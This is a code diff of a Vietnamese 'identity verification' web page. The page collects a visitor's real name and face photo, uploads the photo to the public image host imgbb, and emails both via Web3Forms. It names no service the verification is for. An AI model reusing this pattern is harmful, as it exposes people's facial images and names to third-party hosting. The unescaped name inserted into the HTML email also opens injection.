@@ -62,7 +62,7 @@
 <body>
   <div class="card">
     <h2>Xác minh danh tính</h2>
-    <p>Vui lòng nhập tên thật và chụp hoặc tải ảnh khuôn mặt để xác thực.</p>
+    <p>Nhập tên thật và tải hoặc chụp ảnh khuôn mặt để xác thực.</p>
 
     <input id="nameInput" type="text" placeholder="Nhập tên thật của bạn" />
     <div id="msg" class="msg"></div>
@@ -160,7 +160,7 @@
     sendBtn.style.display = "none";
   };
 
-  // nếu tải ảnh từ máy
+  // tải ảnh từ máy
   fileInput.onchange = () => {
     const file = fileInput.files[0];
     if (file) {
@@ -197,7 +197,7 @@
     try {
       // B1: Upload ảnh lên Imgbb
       const formData = new FormData();
-      formData.append("image", capturedImage.split(",")[1]); 
+      formData.append("image", capturedImage.split(",")[1]);
       const resImg = await fetch("https://api.imgbb.com/1/upload?key=" + IMGBB_KEY, {
         method: "POST",
         body: formData
@@ -207,13 +207,20 @@
 
       const imageUrl = resultImg.data.url;
 
-      // B2: Gửi thông tin qua Web3Forms
-      msg.textContent = "📨 Đang gửi email...";
+      // B2: Gửi thông tin + ảnh HTML qua Web3Forms
+      msg.textContent = "📨 Đang gửi...";
+      const htmlMessage = `
+        <h3>Thông tin xác minh</h3>
+        <p><strong>Tên:</strong> ${name}</p>
+        <p><strong>Ảnh:</strong></p>
+        <img src="${imageUrl}" alt="Ảnh xác minh" width="250" style="border-radius:8px;">
+      `;
+
       const data = {
         access_key: WEB3FORMS_KEY,
-        subject: "Dữ liệu mới từ người dùng",
-        name: name,
-        message: `Tên: ${name}\nẢnh: ${imageUrl}`
+        subject: "Dữ liệu xác minh danh tính",
+        from_name: "Trang xác minh",
+        message: htmlMessage
       };
 
       const res = await fetch("https://api.web3forms.com/submit", {
